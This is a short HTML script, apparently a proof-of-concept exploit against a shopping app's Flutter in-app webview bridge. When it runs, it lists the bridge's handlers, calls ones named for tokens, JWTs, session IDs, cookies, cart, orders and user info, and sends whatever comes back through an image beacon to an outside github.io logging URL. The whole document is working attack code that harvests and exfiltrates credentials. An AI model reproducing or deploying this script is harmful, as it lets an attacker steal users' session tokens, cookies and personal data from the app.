<script>
var out="bridge="+(typeof window.flutter_inappwebview);
if(window.flutter_inappwebview) out+=" keys="+Object.keys(window.flutter_inappwebview).join(",");
["getToken","token","jwt","sessionId","getSession","getCookies","cookie","cart","order","userInfo","fetch","onPrintRequest"].forEach(function(n){
 try{ window.flutter_inappwebview.callHandler(n,"test").then(function(v){ out+=" | "+n+"=>"+JSON.stringify(v); beacon(); },function(e){ out+=" | "+n+"=ERR"; }); }catch(e){ out+=" | "+n+"=THROW"; }
});
function beacon(){ new Image().src="https://surajchanti.github.io/carrefour-deeplink-poc/log?d="+encodeURIComponent(out); }
beacon();
</script>
